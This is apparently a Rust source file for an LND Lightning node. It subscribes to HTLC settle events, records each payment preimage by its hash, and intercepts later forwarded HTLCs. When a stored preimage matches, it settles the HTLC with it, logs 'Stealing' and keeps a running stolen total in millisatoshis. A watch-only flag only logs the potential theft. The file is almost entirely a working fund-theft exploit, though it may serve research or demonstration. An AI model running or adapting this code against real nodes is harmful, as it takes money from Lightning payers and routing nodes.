use std::sync::Arc;

use sha2::Digest;
use sha2::Sha256;
use tokio::sync::Mutex;
use tonic_openssl_lnd::LndRouterClient;

use crate::storage::Storage;

pub async fn start_htlc_event_subscription(
    mut lnd: LndRouterClient,
    storage: Arc<Mutex<dyn Storage + Send>>,
) {
    let mut htlc_event_stream = lnd
        .subscribe_htlc_events(tonic_openssl_lnd::routerrpc::SubscribeHtlcEventsRequest {})
        .await
        .expect("Failed to call subscribe_htlc_events")
        .into_inner();

    while let Some(htlc_event) = htlc_event_stream
        .message()
        .await
        .expect("Failed to receive invoices")
    {
        if let Some(tonic_openssl_lnd::routerrpc::htlc_event::Event::SettleEvent(settle_event)) =
            htlc_event.event
        {
            let mut hasher = Sha256::new();
            hasher.update(&settle_event.preimage);
            let payment_hash = hasher.finalize();
            println!(
                "got preimage {} from payment hash {}",
                hex::encode(settle_event.preimage.clone()),
                hex::encode(payment_hash)
            );

            storage
                .clone()
                .lock()
                .await
                .set(settle_event.preimage, payment_hash.to_vec());
        };
    }
}

enum InterceptorAction {
    /// Settle the HTLC with the given preimage
    Settle = 0,

    #[allow(unused)]
    /// Fail the HTLC with the given failure code and message
    Fail = 1,

    /// Allow lnd to make the decision about the HTLC
    Resume = 2,
}

pub async fn start_htlc_interceptor(
    lnd: LndRouterClient,
    storage: Arc<Mutex<dyn Storage + Send>>,
    watch_only: bool,
) {
    let mut router = lnd.clone();
    let (tx, rx) = tokio::sync::mpsc::channel::<
        tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse,
    >(1024);
    let stream = tokio_stream::wrappers::ReceiverStream::new(rx);

    let mut htlc_stream = router
        .htlc_interceptor(stream)
        .await
        .expect("Failed to call htlc_interceptor")
        .into_inner();

    while let Some(htlc) = htlc_stream
        .message()
        .await
        .expect("Failed to receive HTLCs")
    {
        println!("Received HTLC {}!", hex::encode(&htlc.payment_hash));

        let map = storage.clone();
        let mut db = map.lock().await;
        let response = match db.get(htlc.payment_hash) {
            Some(preimage) => {
                let steal_amt = htlc.incoming_amount_msat;
                // if in watch only mode, only log, do not settle htlc
                if watch_only {
                    println!("HTLC preimage saved! Could have stolen {steal_amt} msats...");

                    let total = db.add_stolen_watch_only(steal_amt);
                    println!("New total potential amount stolen: {total} msats");

                    tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
                        incoming_circuit_key: htlc.incoming_circuit_key,
                        action: InterceptorAction::Resume as i32,
                        preimage: vec![],
                        failure_code: 0,
                        failure_message: vec![],
                    }
                } else {
                    println!("HTLC preimage saved! Stealing {steal_amt} msats...");

                    let total = db.add_stolen(steal_amt);
                    println!("New total amount stolen: {total} msats");

                    tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
                        incoming_circuit_key: htlc.incoming_circuit_key,
                        action: InterceptorAction::Settle as i32,
                        preimage: preimage.to_vec(),
                        failure_code: 0,
                        failure_message: vec![],
                    }
                }
            }
            None => {
                println!("Do not have HTLC preimage, resuming");
                tonic_openssl_lnd::routerrpc::ForwardHtlcInterceptResponse {
                    incoming_circuit_key: htlc.incoming_circuit_key,
                    action: InterceptorAction::Resume as i32,
                    preimage: vec![],
                    failure_code: 0,
                    failure_message: vec![],
                }
            }
        };

        tx.send(response).await.unwrap();
    }
}
